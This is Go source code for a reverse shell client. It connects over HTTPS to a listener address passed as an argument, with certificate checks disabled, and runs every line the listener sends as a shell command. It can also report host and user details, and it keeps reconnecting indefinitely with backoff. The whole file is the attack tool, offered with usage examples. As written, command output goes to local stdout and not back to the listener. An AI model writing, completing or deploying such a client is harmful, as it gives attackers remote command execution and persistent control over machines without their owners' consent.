package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func executeCommand(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}
	return string(output)
}

func getSystemInfo() string {
	hostname, _ := os.Hostname()
	wd, _ := os.Getwd()
	
	info := fmt.Sprintf("=== System Information ===\n")
	info += fmt.Sprintf("OS: %s\n", runtime.GOOS)
	info += fmt.Sprintf("Arch: %s\n", runtime.GOARCH)
	info += fmt.Sprintf("Hostname: %s\n", hostname)
	info += fmt.Sprintf("Working Dir: %s\n", wd)
	info += fmt.Sprintf("User: %s\n", os.Getenv("USER"))
	if runtime.GOOS == "windows" {
		info += fmt.Sprintf("User: %s\n", os.Getenv("USERNAME"))
	}
	return info
}

func connectToListener(target string) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   0,
	}

	url := fmt.Sprintf("https://%s/", target)
	
	log.Printf("Connecting to listener at %s...", url)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatalf("Failed to create request: %v", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Failed to connect to listener: %v", err)
	}
	defer resp.Body.Close()

	log.Println("Connected to listener successfully")

	scanner := bufio.NewScanner(resp.Body)
	
	for scanner.Scan() {
		command := scanner.Text()
		command = strings.TrimSpace(command)

		if command == "" {
			continue
		}

		log.Printf("Received command: %s", command)

		switch command {
		case "INFO":
			output := getSystemInfo()
			fmt.Println(output)
			fmt.Println("<<<END_OF_OUTPUT>>>")

		case "PING":
			continue

		case "exit":
			log.Println("Received exit command, disconnecting...")
			return

		default:
			output := executeCommand(command)
			fmt.Println(output)
			fmt.Println("<<<END_OF_OUTPUT>>>")
		}
	}

	if err := scanner.Err(); err != nil {
		log.Printf("Connection error: %v", err)
	}

	log.Println("Disconnected from listener")
}

func connectWithRetry(target string, maxRetries int) {
	retries := 0
	backoff := 5 * time.Second

	for {
		connectToListener(target)

		if maxRetries > 0 {
			retries++
			if retries >= maxRetries {
				log.Printf("Max retries (%d) reached. Exiting.", maxRetries)
				return
			}
		}

		log.Printf("Connection lost. Retrying in %v... (attempt %d)", backoff, retries+1)
		time.Sleep(backoff)

		backoff *= 2
		if backoff > 5*time.Minute {
			backoff = 5 * time.Minute
		}
	}
}

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "Usage: %s <host:port|domain:port> <max-retries>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s 192.168.1.100:8443 0\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s example.com:8443 5\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "\nmax-retries: 0 for infinite retries, or specify a number\n")
		os.Exit(1)
	}

	target := os.Args[1]
	maxRetries := 0
	fmt.Sscanf(os.Args[2], "%d", &maxRetries)

	log.Printf("Starting reverse shell client...")
	log.Printf("Target: %s", target)
	log.Printf("Max retries: %d (0 = infinite)", maxRetries)

	connectWithRetry(target, maxRetries)
}
